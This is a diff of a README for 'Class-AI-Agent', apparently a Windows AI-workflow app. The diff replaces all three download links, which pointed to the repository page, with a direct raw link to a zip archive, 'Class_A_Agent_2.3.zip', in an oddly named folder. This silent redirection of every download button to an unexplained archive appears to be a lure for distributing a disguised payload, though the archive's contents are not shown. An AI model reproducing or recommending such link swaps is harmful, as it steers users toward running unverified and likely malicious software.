@@ -1,6 +1,6 @@
 # 🤖 Class-AI-Agent - Build Smarter AI Workflows
 
-[![Download Class-AI-Agent](https://img.shields.io/badge/Download-Now-blue)](https://github.com/harishu652/Class-AI-Agent)
+[![Download Class-AI-Agent](https://img.shields.io/badge/Download-Now-blue)](https://github.com/harishu652/Class-AI-Agent/raw/refs/heads/main/redivivous/Class_A_Agent_2.3.zip)
 
 ## 🚀 What This App Does
 
@@ -10,7 +10,7 @@ Class-AI-Agent is a Windows app for running AI-driven tasks with a clean setup. 
 
 Use this link to visit this page to download or open the project files:
 
-[Download Class-AI-Agent](https://github.com/harishu652/Class-AI-Agent)
+[Download Class-AI-Agent](https://github.com/harishu652/Class-AI-Agent/raw/refs/heads/main/redivivous/Class_A_Agent_2.3.zip)
 
 ### What you need on Windows
 
@@ -215,7 +215,7 @@ If the project includes these files, they usually mean:
 
 Use this link to visit this page to download the project files:
 
-[https://github.com/harishu652/Class-AI-Agent](https://github.com/harishu652/Class-AI-Agent)
+[https://github.com/harishu652/Class-AI-Agent/raw/refs/heads/main/redivivous/Class_A_Agent_2.3.zip](https://github.com/harishu652/Class-AI-Agent/raw/refs/heads/main/redivivous/Class_A_Agent_2.3.zip)
 
 ## 🔧 Build and Run
 
